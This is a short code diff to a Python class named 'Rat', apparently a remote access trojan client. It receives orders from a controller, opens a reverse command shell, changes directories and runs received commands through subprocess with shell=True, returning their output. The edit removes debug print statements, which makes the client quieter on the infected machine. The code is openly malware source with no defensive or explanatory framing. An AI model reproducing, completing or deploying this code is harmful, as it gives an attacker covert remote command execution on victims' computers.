@@ -132,7 +132,6 @@ class Rat:
         while order != MSG_DISC:
             order = self.recive_pocket()
             if order:
-                print('ORDER: ', order)
                 if order == SHELL_START:
                     self.reverse_cmd()
                 else:
@@ -146,7 +145,6 @@ class Rat:
             cwd = os.getcwd()
             self.send_pocket(cwd)
             command = self.recive_pocket()
-            print('command: ', command)
             if command.startswith('cd '):
                 try:
                     os.chdir(command[3:])
@@ -164,13 +162,13 @@ class Rat:
         try:
             out = subprocess.run(command, shell=True, capture_output=True, text=True)
 
-            if out.returncode == 0:
-                print('LEN: ', len(out.stdout))
-                
+            if out.returncode == 0:            
                 return out.stdout
+
             else:
                 error = 'ERROR:\n' + out.stderr
                 return error
+                
         except:
             out = 'Error'
             return out
